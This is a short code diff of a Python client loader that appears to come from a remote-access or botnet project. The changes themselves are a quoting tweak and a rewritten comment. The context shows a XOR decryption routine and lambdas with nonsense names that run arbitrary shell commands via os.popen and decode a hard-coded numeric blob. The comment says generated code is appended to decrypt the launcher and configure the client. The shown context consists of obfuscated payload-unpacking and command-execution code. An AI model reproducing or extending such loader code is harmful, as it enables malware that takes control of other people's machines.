@@ -77,7 +77,7 @@ def run(*args, **kwargs):
             output  = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
             vector  = block
             result.append(output)
-        return "".join(result).rstrip("\x00")
+        return ''.join(result).rstrip("\x00")
     IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
     RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
@@ -154,7 +154,6 @@ def main(*args, **kwargs):
             time.sleep(1)
             return main(**kwargs)
 
+# Below this line clients append their dynamically generated code
 
-    
-# This line is reserved for the client to replace with a custom "if __name__ == '__main__'" statement with arguments to decrypt the launcher and configure the client.
 
